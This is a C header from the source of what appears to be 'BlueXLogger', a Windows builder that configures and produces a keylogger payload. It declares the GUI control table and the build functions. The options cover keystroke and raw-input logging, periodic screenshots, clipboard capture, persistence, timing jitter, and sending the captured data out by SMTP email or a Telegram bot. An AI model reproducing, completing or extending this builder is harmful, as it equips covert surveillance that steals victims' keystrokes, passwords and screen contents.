/*============================================================================
 * BlueXLogger - src/builder/state.h
 * Control table, config<->form mapping, validation, profiles and the build.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#ifndef BXL_STATE_H
#define BXL_STATE_H

#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_util.h"

/*----------------------------------------------------------------------------
 * Layout, in design units at 96 DPI
 *
 * The window is a fixed-size form: the control table positions everything in
 * absolute design units, so there is nothing meaningful to do with a resize.
 * The single source of truth for the geometry lives here because both the
 * window chrome (main.c) and the control table (state.c) have to agree on it.
 *
 *   +--------------------------------------------------+
 *   | header (title + About)              0 .. 78       |
 *   +---------+----------------------------------------+
 *   | nav     | content area                             |
 *   | rail    |   origin (216, 78)                       |
 *   | 0..216  |   page title, note, then the controls    |
 *   |         |                                          |
 *   +---------+----------------------------------------+
 *   | footer (status + action buttons)  722 .. 800       |
 *   +--------------------------------------------------+
 *--------------------------------------------------------------------------*/
#define BLD_WIN_W      1080
#define BLD_WIN_H      800
#define BLD_HEADER_H   78
#define BLD_FOOTER_H   78
#define BLD_NAV_W      216

/* Origin of the content area. Every x/y in the control table is relative to
 * this point; the layout and paint passes add it, the table never does. */
#define BLD_CONTENT_X  BLD_NAV_W
#define BLD_CONTENT_Y  BLD_HEADER_H

/* Content area extent, available to the page title and note. */
#define BLD_CONTENT_W  (BLD_WIN_W - BLD_NAV_W)
#define BLD_CONTENT_H  (BLD_WIN_H - BLD_HEADER_H - BLD_FOOTER_H)

/* The title and note are stacked in the strip above the first control row.
 * BLD_FIRST_ROW is the y of the first row in the control table; the note is
 * sized to end clear of the label painted above that row. */
#define BLD_TITLE_Y    2
#define BLD_TITLE_H    32
#define BLD_NOTE_Y     (BLD_TITLE_Y + BLD_TITLE_H + 4)
#define BLD_NOTE_H     40
#define BLD_FIRST_ROW  106

/*----------------------------------------------------------------------------
 * Pages
 *--------------------------------------------------------------------------*/
#define PAGE_DELIVERY  0
#define PAGE_TELEGRAM  1
#define PAGE_SCHEDULE  2
#define PAGE_CAPTURE   3
#define PAGE_ADVANCED  4
#define PAGE_BUILD     5
#define PAGE_COUNT     6

/*----------------------------------------------------------------------------
 * Control identifiers
 *--------------------------------------------------------------------------*/
#define IDC_NAV_FIRST     1001
#define IDC_NAV_DELIVERY  1001
#define IDC_NAV_TELEGRAM  1002
#define IDC_NAV_SCHEDULE  1003
#define IDC_NAV_CAPTURE   1004
#define IDC_NAV_ADVANCED  1005
#define IDC_NAV_BUILD     1006
#define IDC_NAV_LAST      1006

#define IDC_RECIPIENT     1101
#define IDC_SENDER        1102
#define IDC_APPPASS       1103
#define IDC_SHOWPASS      1104
#define IDC_AUTHEN        1105
#define IDC_SMTPHOST      1106
#define IDC_SMTPPORT      1107
#define IDC_TLSMODE       1108
#define IDC_SUBJECT       1109
#define IDC_HTMLBODY      1110
#define IDC_SEPARATE      1111
#define IDC_CHANNEL       1112

#define IDC_LOGINT        1201
#define IDC_LOGKEYS       1202
#define IDC_SHOTEN        1203
#define IDC_SHOTINT       1204
#define IDC_DAILYEN       1205
#define IDC_DAILYTIME     1206
#define IDC_JITTEREN      1207
#define IDC_JITTERPCT     1208

#define IDC_MONITORS      1301
#define IDC_SHOTFMT       1302
#define IDC_JPEGQ         1303
#define IDC_MAXDIM        1304
#define IDC_MAXCOUNT      1305
#define IDC_CLIP          1306
#define IDC_RAWIN         1307
#define IDC_SINGLE        1308
#define IDC_HOTKEYEN      1309
#define IDC_HOTKEY        1310
#define IDC_RETENTION     1311
#define IDC_MAXATTACH     1312
#define IDC_QUITHOTKEYEN  1313
#define IDC_QUITHOTKEY    1314

#define IDC_PERSIST       1401
#define IDC_DEBUGLOG      1402
#define IDC_STORAGEDIR    1403
#define IDC_BROWSEDIR     1404

#define IDC_TGTOKEN       1601
#define IDC_TGCHAT        1602
#define IDC_TGHTML        1603
#define IDC_TGSHOTS       1604
#define IDC_TGFULL        1605
#define IDC_TGVERIFY      1606
#define IDC_TGDEMO        1607

#define IDC_OUTDIR        1501
#define IDC_OUTNAME       1502
#define IDC_BROWSEOUT     1503
#define IDC_LOG           1504
#define IDC_SUMMARY       1505
#define IDC_LOAD          1506
#define IDC_SAVE          1507
#define IDC_TESTCONN      1508
#define IDC_TESTMAIL      1509
#define IDC_BUILD         1510
#define IDC_ABOUT         1511
#define IDC_STATUS        1512

/*----------------------------------------------------------------------------
 * Control kinds
 *--------------------------------------------------------------------------*/
#define CK_EDIT   0
#define CK_SEG    1
#define CK_CHK    2
#define CK_MULTI  3
#define CK_BTN    4

typedef struct BxlCtl {
    int            id;
    int            page;       /* PAGE_*  */
    int            x, y, w, h; /* design units, relative to the content area */
    int            kind;       /* CK_*    */
    const wchar_t *label;      /* painted above the control, or NULL         */
    const wchar_t *hint;       /* painted beneath the control, or NULL       */
    const wchar_t *seg_labels; /* pipe-separated, CK_SEG only                */
    HWND           hwnd;
} BxlCtl;

/*----------------------------------------------------------------------------
 * Lifecycle
 *--------------------------------------------------------------------------*/

/* Create every control on every page. */
void bld_controls_create(HWND parent);

/* Position and size the controls belonging to page (and the always-visible
 * ones). Called on creation and on every resize. */
void bld_controls_layout(HWND parent, int page, int content_w, int content_h);

/* Show only the controls belonging to page. */
void bld_controls_show_page(HWND parent, int page);

/* Paint the labels, hints and rounded input wells behind the child controls
 * of the given page. Called from the parent's WM_PAINT. */
void bld_paint_page(HWND parent, HDC dc, int page, int content_w, int content_h);

/* Look up a control HWND by id (NULL when unknown). */
HWND bld_ctl(int id);

/* The table itself, for the parent's iteration. */
const BxlCtl *bld_ctl_table(int *count_out);

/* Mark / query a control's invalid state (drives the red outline).
 * The flag lives here rather than in the widget because stock EDIT controls
 * have no widget state of their own. */
void bld_mark_invalid(int id, int invalid);
void bld_clear_invalid(void);
int  bld_is_invalid(int id);

/*----------------------------------------------------------------------------
 * Config <-> form
 *--------------------------------------------------------------------------*/
void bld_state_defaults(BxlConfig *cfg);

/* Write cfg into the controls. */
void bld_state_push(const BxlConfig *cfg);

/* Read the controls back into cfg. Returns BXL_TRUE when every field parsed
 * and passed range validation; on failure err receives a message and the
 * offending controls are marked invalid. */
int bld_state_pull(BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* Refresh the Build page's read-only summary of the current settings. */
void bld_state_summary(void);

/* React to the TLS mode segment being clicked. The segments carry the port
 * each mode expects in their labels, so selecting one moves the port with it
 * unless the operator has typed a port of their own. */
void bld_tls_mode_changed(void);

/* React to the delivery-channel segment being clicked. Clears error marks on
 * the fields that are no longer part of the chosen channel and refreshes the
 * summary. The footer test buttons are relabelled by the main window, which
 * reads bld_channel_current() for itself. */
void bld_channel_changed(void);

/* The currently selected delivery channel (BXL_CHANNEL_*). */
int bld_channel_current(void);

/*----------------------------------------------------------------------------
 * Build log panel
 *--------------------------------------------------------------------------*/
void bld_log_attach(HWND log_edit);
void bld_log_clear(void);
void bld_log(const wchar_t *fmt, ...);

/* Footer status line. kind: 0 neutral, 1 success, 2 error. The text is
 * painted by the main window, which polls bld_status_text(). */
void bld_status(const wchar_t *fmt, int kind, ...);
const wchar_t *bld_status_text(int *kind_out);

/* Builder-local output settings (not part of BxlConfig). */
const wchar_t *bld_out_dir(void);
const wchar_t *bld_out_name(void);

/*----------------------------------------------------------------------------
 * Actions
 *--------------------------------------------------------------------------*/
int bld_profile_save(const BxlConfig *cfg, wchar_t *err, size_t err_cch);
int bld_profile_load(BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* Connect, negotiate TLS and authenticate, then disconnect without sending
 * anything. Reports the server greeting and the exact stage that failed, so
 * "is my Gmail setup right?" has an answer that does not depend on a message
 * arriving in an inbox. */
int bld_test_connection(const BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* Send one real demo message using the current settings. */
int bld_test_email(const BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* getMe: proves the bot token is valid and api.telegram.org is reachable,
 * without posting anything to the chat. */
int bld_test_telegram(const BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* Post one real message (and, when configured, one screenshot) to the chat. */
int bld_test_telegram_demo(const BxlConfig *cfg, wchar_t *err, size_t err_cch);

/* Produce the configured payload. On success out_path receives the output
 * path. */
int bld_build(const BxlConfig *cfg, wchar_t *out_path, size_t out_cch,
              wchar_t *err, size_t err_cch);

/* Resolve the unconfigured template: <builder dir>\payload_template.exe when
 * present, otherwise the copy embedded as the BXL_TEMPLATE resource. */
int bld_template_path(wchar_t *out, size_t out_cch, wchar_t *err, size_t err_cch);

#endif /* BXL_STATE_H */
